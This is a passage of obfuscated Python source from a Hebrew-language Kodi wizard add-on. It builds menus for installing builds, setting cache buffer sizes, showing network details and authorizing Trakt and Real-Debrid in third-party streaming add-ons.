         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1683
   try :#line:1700
    return OO0OO0OO0000OOO00 #line:1701
   except :pass #line:1702
def getpass ():#line:1703
	disply_hwr2 ()#line:1705
def setpass ():#line:1706
    O000OOOOOOOO0O0OO =xbmcgui .Dialog ()#line:1707
    OO0O0OOOOO0OO00O0 =''#line:1708
    OO00OO0O00OOO0OOO =xbmc .Keyboard (OO0O0OOOOO0OO00O0 ,'הכנס סיסמה')#line:1710
    OO00OO0O00OOO0OOO .doModal ()#line:1711
    if OO00OO0O00OOO0OOO .isConfirmed ():#line:1712
           OO00OO0O00OOO0OOO =OO00OO0O00OOO0OOO .getText ()#line:1713
    wiz .setS ('pass',str (OO00OO0O00OOO0OOO ))#line:1714
def setuname ():#line:1715
    O0OOO00OO0OOO0O0O =''#line:1716
    O000000000O000OO0 =xbmc .Keyboard (O0OOO00OO0OOO0O0O ,'הכנס שם משתמש')#line:1717
    O000000000O000OO0 .doModal ()#line:1718
    if O000000000O000OO0 .isConfirmed ():#line:1719
           O0OOO00OO0OOO0O0O =O000000000O000OO0 .getText ()#line:1720
           wiz .setS ('user',str (O0OOO00OO0OOO0O0O ))#line:1721
def powerkodi ():#line:1722
    os ._exit (1 )#line:1723
def buffer1 ():#line:1725
	O0O0OO000OOO0O0OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1726
	OO0000O00OO0OOOOO =xbmc .getInfoLabel ("System.Memory(total)")#line:1727
	OO00O00OOOO000O00 =xbmc .getInfoLabel ("System.FreeMemory")#line:1728
	OOOOOOO000O0O00OO =re .sub ('[^0-9]','',OO00O00OOOO000O00 )#line:1729
	OOOOOOO000O0O00OO =int (OOOOOOO000O0O00OO )/3 #line:1730
	OOOOOOOO000OO00OO =OOOOOOO000O0O00OO *1024 *1024 #line:1731
	try :O0O00O0O0000OOOOO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1732
	except :O0O00O0O0000OOOOO =16 #line:1733
	O00OO0O000OO0OO00 =DIALOG .yesno ('FREE MEMORY: '+str (OO00O00OOOO000O00 ),'Based on your free Memory your optimal buffersize is: '+str (OOOOOOO000O0O00OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1736
	if O00OO0O000OO0OO00 ==1 :#line:1737
		with open (O0O0OO000OOO0O0OO ,"w")as OOOOO00O00000000O :#line:1738
			if O0O00O0O0000OOOOO >=17 :O000O00OO0O0OOOO0 =xml_data_advSettings_New (str (OOOOOOOO000OO00OO ))#line:1739
			else :O000O00OO0O0OOOO0 =xml_data_advSettings_old (str (OOOOOOOO000OO00OO ))#line:1740
			OOOOO00O00000000O .write (O000O00OO0O0OOOO0 )#line:1742
			DIALOG .ok ('Buffer Size Set to: '+str (OOOOOOOO000OO00OO ),'Please restart Kodi for settings to apply.','')#line:1743
	elif O00OO0O000OO0OO00 ==0 :#line:1745
		OOOOOOOO000OO00OO =_OO00OO0OOO0000OO0 (default =str (OOOOOOOO000OO00OO ),heading ="INPUT BUFFER SIZE")#line:1746
		with open (O0O0OO000OOO0O0OO ,"w")as OOOOO00O00000000O :#line:1747
			if O0O00O0O0000OOOOO >=17 :O000O00OO0O0OOOO0 =xml_data_advSettings_New (str (OOOOOOOO000OO00OO ))#line:1748
			else :O000O00OO0O0OOOO0 =xml_data_advSettings_old (str (OOOOOOOO000OO00OO ))#line:1749
			OOOOO00O00000000O .write (O000O00OO0O0OOOO0 )#line:1750
			DIALOG .ok ('Buffer Size Set to: '+str (OOOOOOOO000OO00OO ),'Please restart Kodi for settings to apply.','')#line:1751
def xml_data_advSettings_old (OO0O0OOOO0OO000OO ):#line:1752
	O0000O000OO0O000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O0OOOO0OO000OO #line:1762
	return O0000O000OO0O000O #line:1763
def xml_data_advSettings_New (O0O0OO00O0O00OO0O ):#line:1765
	OO0O0O0OO000OOO00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0O0OO00O0O00OO0O #line:1777
	return OO0O0O0OO000OOO00 #line:1778
def write_ADV_SETTINGS_XML (O000000OOOOO00OOO ):#line:1779
    if not os .path .exists (xml_file ):#line:1780
        with open (xml_file ,"w")as OOO0O000O00000O00 :#line:1781
            OOO0O000O00000O00 .write (xml_data )#line:1782
def _OO00OO0OOO0000OO0 (default ="",heading ="",hidden =False ):#line:1783
    ""#line:1784
    OOOOOO0OO00000OO0 =xbmc .Keyboard (default ,heading ,hidden )#line:1785
    OOOOOO0OO00000OO0 .doModal ()#line:1786
    if (OOOOOO0OO00000OO0 .isConfirmed ()):#line:1787
        return unicode (OOOOOO0OO00000OO0 .getText (),"utf-8")#line:1788
    return default #line:1789
def index ():#line:1791
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1792
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1793
	if AUTOUPDATE =='Yes':#line:1794
		if wiz .workingURL (WIZARDFILE )==True :#line:1795
			OO0OOOOOOOOO00OO0 =wiz .checkWizard ('version')#line:1796
			if OO0OOOOOOOOO00OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO0OOOOOOOOO00OO0 ),'wizardupdate',themeit =THEME2 )#line:1797
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1798
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1799
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1800
	if len (BUILDNAME )>0 :#line:1801
		OOO0OOOO0OO0O0O0O =wiz .checkBuild (BUILDNAME ,'version')#line:1802
		O00O0O00O00OOO00O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1803
		if OOO0OOOO0OO0O0O0O >BUILDVERSION :O00O0O00O00OOO00O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O00O0O00O00OOO00O ,OOO0OOOO0OO0O0O0O )#line:1804
		addDir (O00O0O00O00OOO00O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1806
		try :#line:1808
		     O0000OO0O000OOO00 =wiz .themeCount (BUILDNAME )#line:1809
		except :#line:1810
		   O0000OO0O000OOO00 =False #line:1811
		if not O0000OO0O000OOO00 ==False :#line:1812
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1813
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1814
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1817
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1818
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1819
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1823
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1825
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1827
def morsetup ():#line:1829
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1830
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1831
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1832
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1833
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1837
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1838
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1841
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1842
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1844
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1845
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1853
	setView ('files','viewType')#line:1854
def morsetup2 ():#line:1855
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1856
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1857
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1858
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1859
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1861
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1862
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1863
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1864
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1865
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1866
def fastupdate ():#line:1867
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1868
def forcefastupdate ():#line:1870
			O000000O00OO0OO00 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1871
			wiz .ForceFastUpDate (ADDONTITLE ,O000000O00OO0OO00 )#line:1872
def rdsetup ():#line:1876
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1877
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1878
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1879
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1880
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1881
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1882
	setView ('files','viewType')#line:1883
def traktsetup ():#line:1885
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1888
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1889
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1890
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1891
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1892
	setView ('files','viewType')#line:1893
def resolveurlsetup ():#line:1895
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1896
def urlresolversetup ():#line:1897
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1898
def placentasetup ():#line:1900
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1901
def reptiliasetup ():#line:1902
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1903
def flixnetsetup ():#line:1904
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1905
def yodasetup ():#line:1906
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1907
def numberssetup ():#line:1908
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1909
def uranussetup ():#line:1910
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1911
def genesissetup ():#line:1912
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1913
def net_tools (view =None ):#line:1915
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1916
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1917
	setView ('files','viewType')#line:1919
def speedMenu ():#line:1920
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1921
def viewIP ():#line:1922
	O000O000O0000OOOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1936
	OO00OO000O00OOO00 =[];OOOO0OO0OO0O00OOO =0 #line:1937
	for O000OO00O0OOO00O0 in O000O000O0000OOOO :#line:1938
		O0OOOOOO0OOO0OOO0 =wiz .getInfo (O000OO00O0OOO00O0 )#line:1939
		OO0OO0O0O0O00000O =0 #line:1940
		while O0OOOOOO0OOO0OOO0 =="Busy"and OO0OO0O0O0O00000O <10 :#line:1941
			O0OOOOOO0OOO0OOO0 =wiz .getInfo (O000OO00O0OOO00O0 );OO0OO0O0O0O00000O +=1 ;wiz .log ("%s sleep %s"%(O000OO00O0OOO00O0 ,str (OO0OO0O0O0O00000O )));xbmc .sleep (1000 )#line:1942
		OO00OO000O00OOO00 .append (O0OOOOOO0OOO0OOO0 )#line:1943
		OOOO0OO0OO0O00OOO +=1 #line:1944
	O0O000OO0OO0OOOO0 ,OOOO0O00000O0O000 ,OOOOO000O0OO0O000 =getIP ()#line:1945
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000O00OOO00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1946
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000OO0OO0OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1947
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00000O0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1948
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO000O0OO0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1949
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000O00OOO00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1950
	setView ('files','viewType')#line:1951
def buildMenu ():#line:1953
	if USERNAME =='':#line:1954
		ADDON .openSettings ()#line:1955
		sys .exit ()#line:1956
	if PASSWORD =='':#line:1957
		ADDON .openSettings ()#line:1958
	O0000O0OOOOOOOOO0 =u_list (SPEEDFILE )#line:1959
	(O0000O0OOOOOOOOO0 )#line:1960
	OOOOO0O0O00OOO0OO =(wiz .workingURL (O0000O0OOOOOOOOO0 ))#line:1961
	(OOOOO0O0O00OOO0OO )#line:1962
	OOOOO0O0O00OOO0OO =wiz .workingURL (SPEEDFILE )#line:1963
	if not OOOOO0O0O00OOO0OO ==True :#line:1964
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1965
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1966
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1967
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1968
		addFile ('%s'%OOOOO0O0O00OOO0OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1969
	else :#line:1970
		O0O00O0O0OOO0OO0O ,O000OO0O00O00OOOO ,OO0OOOOOO0OO00000 ,OO0O0O0O00OOOO0O0 ,O0OO00000O0O0O0OO ,OOO000O00OOOOOOOO ,OO00000O0O0OO0O00 =wiz .buildCount ()#line:1971
		OO0000000O0O00O00 =False ;O000O00O00O000O00 =[]#line:1972
		if THIRDPARTY =='true':#line:1973
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0000000O0O00O00 =True ;O000O00O00O000O00 .append ('1')#line:1974
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0000000O0O00O00 =True ;O000O00O00O000O00 .append ('2')#line:1975
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0000000O0O00O00 =True ;O000O00O00O000O00 .append ('3')#line:1976
		O00000000OO0O00O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1977
		O00000OOO0OOO0OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00000000OO0O00O0 )#line:1978
		if O0O00O0O0OOO0OO0O ==1 and OO0000000O0O00O00 ==False :#line:1979
			for OO000OO00O000O000 ,OO00O0O0000OOOOO0 ,OOOOO0OOOO0O0OO0O ,OOO0OOO0O0OOO000O ,OOO0O0000O0O00000 ,O00OO00000O00O000 ,OOOOO00O0O000O000 ,O000O0OOO00OOO000 ,O0O0OOOOOO0O0OO0O ,O0OOOO00000O00OO0 in O00000OOO0OOO0OOO :#line:1980
				if not SHOWADULT =='true'and O0O0OOOOOO0O0OO0O .lower ()=='yes':continue #line:1981
				if not DEVELOPER =='true'and wiz .strTest (OO000OO00O000O000 ):continue #line:1982
				viewBuild (O00000OOO0OOO0OOO [0 ][0 ])#line:1983
				return #line:1984
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1987
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1988
		if OO0000000O0O00O00 ==True :#line:1989
			for OO0O000OO0O0OOO00 in O000O00O00O000O00 :#line:1990
				OO000OO00O000O000 =eval ('THIRD%sNAME'%OO0O000OO0O0OOO00 )#line:1991
		if len (O00000OOO0OOO0OOO )>=1 :#line:1993
			if SEPERATE =='true':#line:1994
				for OO000OO00O000O000 ,OO00O0O0000OOOOO0 ,OOOOO0OOOO0O0OO0O ,OOO0OOO0O0OOO000O ,OOO0O0000O0O00000 ,O00OO00000O00O000 ,OOOOO00O0O000O000 ,O000O0OOO00OOO000 ,O0O0OOOOOO0O0OO0O ,O0OOOO00000O00OO0 in O00000OOO0OOO0OOO :#line:1995
					if not SHOWADULT =='true'and O0O0OOOOOO0O0OO0O .lower ()=='yes':continue #line:1996
					if not DEVELOPER =='true'and wiz .strTest (OO000OO00O000O000 ):continue #line:1997
					O00OO00O000OO0OOO =createMenu ('install','',OO000OO00O000O000 )#line:1998
					addDir ('[%s] %s (v%s)'%(float (OOO0O0000O0O00000 ),OO000OO00O000O000 ,OO00O0O0000OOOOO0 ),'viewbuild',OO000OO00O000O000 ,description =O0OOOO00000O00OO0 ,fanart =O000O0OOO00OOO000 ,icon =OOOOO00O0O000O000 ,menu =O00OO00O000OO0OOO ,themeit =THEME2 )#line:1999
			else :#line:2000
				if OO0O0O0O00OOOO0O0 >0 :#line:2001
					OOO0OOOOOOOOO0000 ='+'if SHOW17 =='false'else '-'#line:2002
					if SHOW17 =='true':#line:2004
						for OO000OO00O000O000 ,OO00O0O0000OOOOO0 ,OOOOO0OOOO0O0OO0O ,OOO0OOO0O0OOO000O ,OOO0O0000O0O00000 ,O00OO00000O00O000 ,OOOOO00O0O000O000 ,O000O0OOO00OOO000 ,O0O0OOOOOO0O0OO0O ,O0OOOO00000O00OO0 in O00000OOO0OOO0OOO :#line:2006
							if not SHOWADULT =='true'and O0O0OOOOOO0O0OO0O .lower ()=='yes':continue #line:2007
							if not DEVELOPER =='true'and wiz .strTest (OO000OO00O000O000 ):continue #line:2008
							OO0O000000O0O0000 =int (float (OOO0O0000O0O00000 ))#line:2009
							if OO0O000000O0O0000 ==17 :#line:2010
								O00OO00O000OO0OOO =createMenu ('install','',OO000OO00O000O000 )#line:2011
								addDir ('[%s] %s (v%s)'%(float (OOO0O0000O0O00000 ),OO000OO00O000O000 ,OO00O0O0000OOOOO0 ),'viewbuild',OO000OO00O000O000 ,description =O0OOOO00000O00OO0 ,fanart =O000O0OOO00OOO000 ,icon =OOOOO00O0O000O000 ,menu =O00OO00O000OO0OOO ,themeit =THEME2 )#line:2012
				if O0OO00000O0O0O0OO >0 :#line:2013
					OOO0OOOOOOOOO0000 ='+'if SHOW18 =='false'else '-'#line:2014
					if SHOW18 =='true':#line:2016
						for OO000OO00O000O000 ,OO00O0O0000OOOOO0 ,OOOOO0OOOO0O0OO0O ,OOO0OOO0O0OOO000O ,OOO0O0000O0O00000 ,O00OO00000O00O000 ,OOOOO00O0O000O000 ,O000O0OOO00OOO000 ,O0O0OOOOOO0O0OO0O ,O0OOOO00000O00OO0 in O00000OOO0OOO0OOO :#line:2018
							if not SHOWADULT =='true'and O0O0OOOOOO0O0OO0O .lower ()=='yes':continue #line:2019
							if not DEVELOPER =='true'and wiz .strTest (OO000OO00O000O000 ):continue #line:2020
							OO0O000000O0O0000 =int (float (OOO0O0000O0O00000 ))#line:2021
							if OO0O000000O0O0000 ==18 :#line:2022
								O00OO00O000OO0OOO =createMenu ('install','',OO000OO00O000O000 )#line:2023
								addDir ('[%s] %s (v%s)'%(float (OOO0O0000O0O00000 ),OO000OO00O000O000 ,OO00O0O0000OOOOO0 ),'viewbuild',OO000OO00O000O000 ,description =O0OOOO00000O00OO0 ,fanart =O000O0OOO00OOO000 ,icon =OOOOO00O0O000O000 ,menu =O00OO00O000OO0OOO ,themeit =THEME2 )#line:2024
				if OO0OOOOOO0OO00000 >0 :#line:2025
					OOO0OOOOOOOOO0000 ='+'if SHOW16 =='false'else '-'#line:2026
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO0OOOOOOOOO0000 ,OO0OOOOOO0OO00000 ),'togglesetting','show16',themeit =THEME3 )#line:2027
					if SHOW16 =='true':#line:2028
						for OO000OO00O000O000 ,OO00O0O0000OOOOO0 ,OOOOO0OOOO0O0OO0O ,OOO0OOO0O0OOO000O ,OOO0O0000O0O00000 ,O00OO00000O00O000 ,OOOOO00O0O000O000 ,O000O0OOO00OOO000 ,O0O0OOOOOO0O0OO0O ,O0OOOO00000O00OO0 in O00000OOO0OOO0OOO :#line:2029
							if not SHOWADULT =='true'and O0O0OOOOOO0O0OO0O .lower ()=='yes':continue #line:2030
							if not DEVELOPER =='true'and wiz .strTest (OO000OO00O000O000 ):continue #line:2031
							OO0O000000O0O0000 =int (float (OOO0O0000O0O00000 ))#line:2032
							if OO0O000000O0O0000 ==16 :#line:2033
								O00OO00O000OO0OOO =createMenu ('install','',OO000OO00O000O000 )#line:2034
								addDir ('[%s] %s (v%s)'%(float (OOO0O0000O0O00000 ),OO000OO00O000O000 ,OO00O0O0000OOOOO0 ),'viewbuild',OO000OO00O000O000 ,description =O0OOOO00000O00OO0 ,fanart =O000O0OOO00OOO000 ,icon =OOOOO00O0O000O000 ,menu =O00OO00O000OO0OOO ,themeit =THEME2 )#line:2035
				if O000OO0O00O00OOOO >0 :#line:2036
					OOO0OOOOOOOOO0000 ='+'if SHOW15 =='false'else '-'#line:2037
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO0OOOOOOOOO0000 ,O000OO0O00O00OOOO ),'togglesetting','show15',themeit =THEME3 )#line:2038
					if SHOW15 =='true':#line:2039
						for OO000OO00O000O000 ,OO00O0O0000OOOOO0 ,OOOOO0OOOO0O0OO0O ,OOO0OOO0O0OOO000O ,OOO0O0000O0O00000 ,O00OO00000O00O000 ,OOOOO00O0O000O000 ,O000O0OOO00OOO000 ,O0O0OOOOOO0O0OO0O ,O0OOOO00000O00OO0 in O00000OOO0OOO0OOO :#line:2040
							if not SHOWADULT =='true'and O0O0OOOOOO0O0OO0O .lower ()=='yes':continue #line:2041
							if not DEVELOPER =='true'and wiz .strTest (OO000OO00O000O000 ):continue #line:2042
							OO0O000000O0O0000 =int (float (OOO0O0000O0O00000 ))#line:2043
							if OO0O000000O0O0000 <=15 :#line:2044
								O00OO00O000OO0OOO =createMenu ('install','',OO000OO00O000O000 )#line:2045
								addDir ('[%s] %s (v%s)'%(float (OOO0O0000O0O00000 ),OO000OO00O000O000 ,OO00O0O0000OOOOO0 ),'viewbuild',OO000OO00O000O000 ,description =O0OOOO00000O00OO0 ,fanart =O000O0OOO00OOO000 ,icon =OOOOO00O0O000O000 ,menu =O00OO00O000OO0OOO ,themeit =THEME2 )#line:2046
		elif OO00000O0O0OO0O00 >0 :#line:2047
			if OOO000O00OOOOOOOO >0 :#line:2048
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2050
			else :#line:2051
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2052
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2053
	setView ('files','viewType')#line:2054
def viewBuild (OO00OO00O00OO00O0 ):#line:2056
	OOO0OOO00OOO0000O =wiz .workingURL (SPEEDFILE )#line:2057
	if not OOO0OOO00OOO0000O ==True :#line:2058
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2059
		addFile ('%s'%OOO0OOO00OOO0000O ,'',themeit =THEME3 )#line:2060
		return #line:2061
	if wiz .checkBuild (OO00OO00O00OO00O0 ,'version')==False :#line:2062
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2063
		addFile ('%s was not found in the builds list.'%OO00OO00O00OO00O0 ,'',themeit =THEME3 )#line:2064
		return #line:2065
	OOO00OO00OOOOOOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2066
	OO00000O0OO0O000O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00OO00O00OO00O0 ).findall (OOO00OO00OOOOOOO0 )#line:2067
	for OOOO00O00O0O000O0 ,OO0000O00O000O0OO ,OO000OO0O00000O0O ,OO0000OO000O0O000 ,OOOOOO0000OO00OOO ,O000O0O0O0O0O0O00 ,OO0O0OOO000OO0O0O ,O0OOOO00O0O0O000O ,OOOO0OOO000OOO000 ,O00O0O0OOO0O00O0O in OO00000O0OO0O000O :#line:2068
		O000O0O0O0O0O0O00 =O000O0O0O0O0O0O00 if wiz .workingURL (O000O0O0O0O0O0O00 )else ICON #line:2069
		OO0O0OOO000OO0O0O =OO0O0OOO000OO0O0O if wiz .workingURL (OO0O0OOO000OO0O0O )else FANART #line:2070
		O0O0OOOO0OO00O000 ='%s (v%s)'%(OO00OO00O00OO00O0 ,OOOO00O00O0O000O0 )#line:2071
		if BUILDNAME ==OO00OO00O00OO00O0 and OOOO00O00O0O000O0 >BUILDVERSION :#line:2072
			O0O0OOOO0OO00O000 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0O0OOOO0OO00O000 ,BUILDVERSION )#line:2073
